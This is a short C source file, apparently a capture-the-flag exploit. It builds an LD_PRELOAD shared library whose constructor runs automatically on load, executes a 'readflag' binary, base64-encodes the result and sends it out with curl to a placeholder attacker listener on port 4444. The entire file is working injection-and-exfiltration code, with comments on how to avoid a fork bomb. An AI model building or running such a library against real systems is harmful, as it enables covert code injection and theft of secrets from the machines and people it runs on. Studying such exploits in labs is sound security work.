#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

#ifndef CALLBACK
#define CALLBACK "http://YOUR-LISTENER:4444"
#endif

__attribute__((constructor))
static void run(void)
{
    /* Run once; the loader can invoke constructors more than once across a
     * process tree, and we are about to spawn child processes. */
    static int done = 0;
    if (done) {
        return;
    }
    done = 1;

    /* Critical: drop LD_PRELOAD from the environment before spawning a shell,
     * otherwise /bin/sh, curl and base64 would each re-load this library and
     * re-enter the constructor -- a fork bomb. (readflag is setuid, so the
     * loader already ignores LD_PRELOAD for it.) */
    unsetenv("LD_PRELOAD");

    const char *cb = getenv("CB");
    if (cb == NULL || cb[0] == '\0') {
        cb = CALLBACK;
    }

    char cmd[2048];
    snprintf(cmd, sizeof cmd,
             "curl -s \"%s/?f=$(/usr/local/bin/readflag | base64 -w0)\" >/dev/null 2>&1",
             cb);
    system(cmd);
}
